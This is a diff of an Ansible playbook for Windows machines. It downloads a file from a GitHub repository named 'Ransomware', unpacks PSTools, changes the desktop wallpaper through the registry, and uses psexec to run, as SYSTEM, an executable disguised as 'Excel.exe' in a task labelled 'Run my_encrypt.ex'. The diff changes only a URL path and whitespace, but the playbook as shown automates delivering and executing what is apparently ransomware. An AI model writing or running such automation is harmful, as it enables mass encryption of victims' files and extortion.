@@ -17,7 +17,7 @@
 
      - name: Download harck.jpg from github
        win_get_url:
-         url: https://github.com/GilesFa/Ransomware/raw/master/output/harck.jpg
+         url: https://github.com/GilesFa/Ransomware/raw/master/harck.jpg
          dest: C:\123.jog
 
      - name: Install 7zip
@@ -31,7 +31,7 @@
        community.windows.win_unzip:
          src: 'C:\PSTools.zip'
          dest: 'C:\output'
-      
+
      - name: Change Wallpaper
        win_regedit:
          path: HKCU:\Control Panel\Desktop\Wallpaper
@@ -41,6 +41,6 @@
          state: present
 
      - name: Run my_encrypt.ex
-       win_command: "c:\\output\\psexec.exe -accepteula -nobanner -i 1 -s c:\\Excel.exe"    
+       win_command: "c:\\output\\psexec.exe -accepteula -nobanner -i 1 -s c:\\Excel.exe"
        register: output
      - debug: var=output
